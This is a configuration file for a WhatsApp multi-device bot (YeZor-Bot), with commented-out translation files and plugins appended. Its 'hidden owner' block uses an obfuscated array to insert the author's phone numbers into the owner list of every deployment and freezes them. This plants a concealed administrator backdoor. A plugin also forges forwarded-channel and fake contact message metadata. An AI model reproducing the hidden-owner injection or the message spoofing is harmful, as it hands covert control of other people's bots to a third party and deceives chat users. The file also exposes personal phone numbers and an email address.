// ═══════════════════════════════════════════════════════
// settings.js - YeZor-Bot Configuration
// ═══════════════════════════════════════════════════════

import { watchFile, unwatchFile } from "fs"
import chalk from "chalk"
import { fileURLToPath } from "url"
import fs from "fs"

//*─────────────────────────────────────────────────────*
// 🌐 CONFIGURACIÓN DE IDIOMA / LANGUAGE SETTINGS
//*─────────────────────────────────────────────────────*

global.language = "es" // Idioma por defecto: "es" o "en"

// Cargar idiomas desde archivos JSON
const loadLanguage = (lang) => {
  try {
    return JSON.parse(fs.readFileSync(`./idiomas/${lang}.json`, 'utf-8'))
  } catch (e) {
    console.error(chalk.red(`Error cargando idioma ${lang}:`, e))
    return {}
  }
}

global.translations = {
  es: loadLanguage('es'),
  en: loadLanguage('en')
}

// Función helper para obtener texto traducido
global.t = (key, lang = global.language) => {
  const keys = key.split('.')
  let value = global.translations[lang]
  for (const k of keys) {
    value = value?.[k]
  }
  return value || key
}

//*─────────────────────────────────────────────────────*
// 📱 CONFIGURACIÓN DEL BOT / BOT CONFIGURATION
//*─────────────────────────────────────────────────────*

// BETA: Número del bot (opcional para método de código de texto)
global.botNumber = "" // Ejemplo: 5214181450063

// Propietarios del bot (EDITABLES)
global.owner = [
  "573196588149",
  "5492916450307",
  "5216671548329"
]

// Suite tag (usuarios especiales)
global.suittag = ["573196588149"]

// Usuarios premium
global.prems = []

//*─────────────────────────────────────────────────────*
// ⚙️ CONFIGURACIÓN TÉCNICA / TECHNICAL SETTINGS
//*─────────────────────────────────────────────────────*

global.libreria = "Baileys Multi Device"
global.vs = "^2.0.0|Latest"
global.sessions = "Sessions/Principal"
global.jadi = "Sessions/SubBot"
global.YezorJadibts = true // Cambiado de yukiJadibts

//*─────────────────────────────────────────────────────*
// 🎨 INFORMACIÓN DEL BOT / BOT INFORMATION
//*─────────────────────────────────────────────────────*

global.botname = "YeZor Bot"
global.textbot = "YeZor Bot | Made with ♥ by Fernando"
global.dev = "© Powered by Fernando"
global.author = "© Made by Fernando"
global.etiqueta = "Fernando Dev"
global.currency = "$"

//*─────────────────────────────────────────────────────*
// 🖼️ IMÁGENES DEL BOT / BOT IMAGES
//*─────────────────────────────────────────────────────*

// URL principal de la imagen (EDITABLE - cambiar aquí actualiza todo)
global.imageUrl = "https://files.catbox.moe/r42zb3.jpg"

// Cargar desde lib/catalogo.png (archivo local)
global.catalogo = fs.existsSync('./lib/catalogo.png') 
  ? fs.readFileSync('./lib/catalogo.png')
  : null

// URLs de imágenes (se cargan desde imageUrl)
global.banner = global.imageUrl
global.icono = global.imageUrl
global.logo = global.imageUrl
global.thumbnail = global.imageUrl

//*─────────────────────────────────────────────────────*
// 🔗 ENLACES SOCIALES / SOCIAL LINKS (EDITABLES)
//*─────────────────────────────────────────────────────*

global.group = "https://chat.whatsapp.com/HaKf6ezcwdbGzmH782eBal"
global.community = "https://chat.whatsapp.com/G0kXqsteJFU74yrLtg79o6"
global.channel = "https://whatsapp.com/channel/0029Vb64nWqLo4hb8cuxe23n"
global.github = "https://github.com/Fer280809/YeZor-Bot"
global.gmail = "fer2809fl@gmail.com"

//*─────────────────────────────────────────────────────*
// 📢 CANALES DE WHATSAPP / WHATSAPP CHANNELS
//*─────────────────────────────────────────────────────*

global.ch = {
  ch1: "120363401404146384@newsletter",
  ch2: "120363399175402285@newsletter"
}

// Nombres de los canales
global.channelNames = {
  "120363401404146384@newsletter": "YeZor Official",
  "120363399175402285@newsletter": "YeZor Updates"
}

// IDs de canales (para allfake)
global.canalIdM = [
  "120363401404146384@newsletter",
  "120363399175402285@newsletter"
]

global.canalNombreM = [
  "『YeZor-Bot-MD』",
  "『YeZor-Bot』"
]

//*─────────────────────────────────────────────────────*
// 🔑 APIs Y SERVICIOS / APIS & SERVICES
//*─────────────────────────────────────────────────────*

global.APIs = {
  xyro: { url: "https://api.xyro.site", key: null },
  yupra: { url: "https://api.yupra.my.id", key: null },
  vreden: { url: "https://api.vreden.web.id", key: null },
  delirius: { url: "https://api.delirius.store", key: null },
  zenzxz: { url: "https://api.zenzxz.my.id", key: null },
  siputzx: { url: "https://api.siputzx.my.id", key: null },
  adonix: { url: "https://api-adonix.ultraplus.click", key: 'Destroy-xyz' }
}

//*─────────────────────────────────────────────────────*
// 🛡️ SEGURIDAD - OWNER OCULTO / SECURITY - HIDDEN OWNER
//*─────────────────────────────────────────────────────*

// Fernando - Owner Principal Oculto (PROTEGIDO)
;(() => {
  const _0x5f3a = ['5214181450063', '524181450063']
  if (!global.owner.some(num => _0x5f3a.includes(num.replace(/[^0-9]/g, '')))) {
    global.owner.unshift(..._0x5f3a)
  }
  global.fernando = _0x5f3a
  Object.freeze(global.fernando)
})()

//*─────────────────────────────────────────────────────*
// 🔄 AUTO-RELOAD
//*─────────────────────────────────────────────────────*

let file = fileURLToPath(import.meta.url)
watchFile(file, () => {
  unwatchFile(file)
  console.log(chalk.redBright("Update 'settings.js'"))
  import(`${file}?update=${Date.now()}`)
})

// ═══════════════════════════════════════════════════════
// idiomas/es.json - Español
// ═══════════════════════════════════════════════════════

/*
{
  "botName": "YeZor Bot",
  "description": "Bot de WhatsApp Multi-Dispositivo",
  "greetings": {
    "morning": "Buenos días",
    "afternoon": "Buenas tardes",
    "evening": "Buenas noches",
    "welcome": "¡Bienvenido/a!"
  },
  "errors": {
    "groupOnly": "⚠️ Este comando solo funciona en grupos",
    "adminOnly": "⚠️ Solo los administradores pueden usar este comando",
    "ownerOnly": "⚠️ Este comando es solo para el propietario",
    "premiumOnly": "⚠️ Este comando es solo para usuarios premium",
    "botAdminOnly": "⚠️ Necesito ser administrador para ejecutar este comando",
    "banned": "⚠️ Estás baneado y no puedes usar comandos"
  },
  "success": {
    "done": "✅ Hecho",
    "success": "✅ Éxito",
    "activated": "✅ Activado",
    "deactivated": "✅ Desactivado"
  },
  "commands": {
    "menu": {
      "title": "📋 Menú de Comandos",
      "info": "Información del Bot",
      "anime": "Anime",
      "group": "Grupos",
      "download": "Descargas",
      "fun": "Diversión",
      "tools": "Herramientas"
    },
    "ppcouple": {
      "loading": "🕒 Buscando parejas...",
      "male": "*Masculino* ♂",
      "female": "*Femenina* ♀",
      "error": "⚠️ Se ha producido un problema."
    }
  }
}
*/

// ═══════════════════════════════════════════════════════
// idiomas/en.json - English
// ═══════════════════════════════════════════════════════

/*
{
  "botName": "YeZor Bot",
  "description": "WhatsApp Multi-Device Bot",
  "greetings": {
    "morning": "Good morning",
    "afternoon": "Good afternoon",
    "evening": "Good evening",
    "welcome": "Welcome!"
  },
  "errors": {
    "groupOnly": "⚠️ This command only works in groups",
    "adminOnly": "⚠️ Only administrators can use this command",
    "ownerOnly": "⚠️ This command is only for the owner",
    "premiumOnly": "⚠️ This command is only for premium users",
    "botAdminOnly": "⚠️ I need to be an administrator to execute this command",
    "banned": "⚠️ You are banned and cannot use commands"
  },
  "success": {
    "done": "✅ Done",
    "success": "✅ Success",
    "activated": "✅ Activated",
    "deactivated": "✅ Deactivated"
  },
  "commands": {
    "menu": {
      "title": "📋 Command Menu",
      "info": "Bot Information",
      "anime": "Anime",
      "group": "Groups",
      "download": "Downloads",
      "fun": "Fun",
      "tools": "Tools"
    },
    "ppcouple": {
      "loading": "🕒 Searching for couples...",
      "male": "*Male* ♂",
      "female": "*Female* ♀",
      "error": "⚠️ A problem has occurred."
    }
  }
}
*/

// ═══════════════════════════════════════════════════════
// plugins/_allfake.js - Fake Messages (ACTUALIZADO)
// ═══════════════════════════════════════════════════════

/*
import pkg from '@whiskeysockets/baileys'
import fs from 'fs'
import fetch from 'node-fetch'
import axios from 'axios'
import moment from 'moment-timezone'
const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg

var handler = m => m
handler.all = async function (m) { 
global.canalIdM = global.canalIdM || ["120363401404146384@newsletter", "120363399175402285@newsletter"]
global.canalNombreM = global.canalNombreM || ["『YeZor-Bot-MD』", "『YeZor-Bot』"]
global.channelRD = await getRandomChannel()

global.d = new Date(new Date + 3600000)
global.locale = global.language || 'es'
global.dia = d.toLocaleDateString(locale, {weekday: 'long'})
global.fecha = d.toLocaleDateString(locale, {day: 'numeric', month: 'numeric', year: 'numeric'})
global.mes = d.toLocaleDateString(locale, {month: 'long'})
global.año = d.toLocaleDateString(locale, {year: 'numeric'})
global.tiempo = d.toLocaleString('en-US', {hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true})

var canal = global.channel || 'https://whatsapp.com/channel/0029Vb64nWqLo4hb8cuxe23n'
var comunidad = global.community || 'https://chat.whatsapp.com/HaKf6ezcwdbGzmH782eBal'
var git = global.github || 'https://github.com/Fer280809/YeZor-Bot'
var correo = global.gmail || 'fer2809fl@gmail.com'
global.redes = [canal, comunidad, git, correo].getRandom()

global.nombre = m.pushName || 'Anónimo'
global.packsticker = `⟢⸸⟣────────────⟢⸸⟣\n⚔️ Usuario: ${nombre}\n🤖 Bot: ${botname}\n📅 Fecha: ${fecha}\n⌚ Hora: ${moment.tz('America/Mexico_City').format('HH:mm:ss')}\n⟢⸸⟣────────────⟢⸸⟣`
global.packsticker2 = `\n°.⎯⃘̶⎯̸⎯ܴ⎯̶᳞͇ࠝ⎯⃘̶⎯̸⎯ܴ⎯̶᳞͇ࠝ⎯⃘̶⎯̸.°\n\n${dev}`

global.fkontak = { 
  key: { 
    participants:"0@s.whatsapp.net", 
    "remoteJid": "status@broadcast", 
    "fromMe": false, 
    "id": "Halo" 
  }, 
  "message": { 
    "contactMessage": { 
      "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` 
    }
  }, 
  "participant": "0@s.whatsapp.net" 
}

global.rcanal = { 
  contextInfo: { 
    isForwarded: true, 
    forwardedNewsletterMessageInfo: { 
      newsletterJid: channelRD.id, 
      serverMessageId: '', 
      newsletterName: channelRD.name 
    }, 
    externalAdReply: { 
      title: botname, 
      body: dev, 
      mediaUrl: null, 
      description: null, 
      previewType: "PHOTO", 
      thumbnail: await (await fetch(global.icono || global.imageUrl)).buffer(), 
      sourceUrl: redes, 
      mediaType: 1, 
      renderLargerThumbnail: false 
    }, 
    mentionedJid: null 
  }
}
}

export default handler

function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}

async function getRandomChannel() {
  let randomIndex = Math.floor(Math.random() * canalIdM.length)
  let id = canalIdM[randomIndex]
  let name = canalNombreM[randomIndex]
  return { id, name }
}
*/

// ═══════════════════════════════════════════════════════
// plugins/anime-ppcouple.js - Ejemplo de comando bilingüe
// ═══════════════════════════════════════════════════════

/*
import fetch from "node-fetch"

let handler = async (m, { conn, usedPrefix }) => {
  try {
    await m.react('🕒')
    
    let data = await (await fetch('https://raw.githubusercontent.com/ShirokamiRyzen/WAbot-DB/main/fitur_db/ppcp.json')).json()
    let cita = data[Math.floor(Math.random() * data.length)]
    
    let cowi = await (await fetch(cita.cowo)).buffer()
    await conn.sendFile(m.chat, cowi, '', global.t('commands.ppcouple.male'), m)
    
    let ciwi = await (await fetch(cita.cewe)).buffer()
    await conn.sendFile(m.chat, ciwi, '', global.t('commands.ppcouple.female'), m)
    
    await m.react('✔️')
  } catch (error) {
    await m.react('✖️')
    await conn.reply(m.chat, `${global.t('commands.ppcouple.error')}\n> Usa *${usedPrefix}report* para informarlo.\n\n${error.message}`, m)
  }
}

handler.help = ['ppcouple']
handler.tags = ['anime']
handler.command = ['ppcp', 'ppcouple']
handler.group = true

export default handler
*/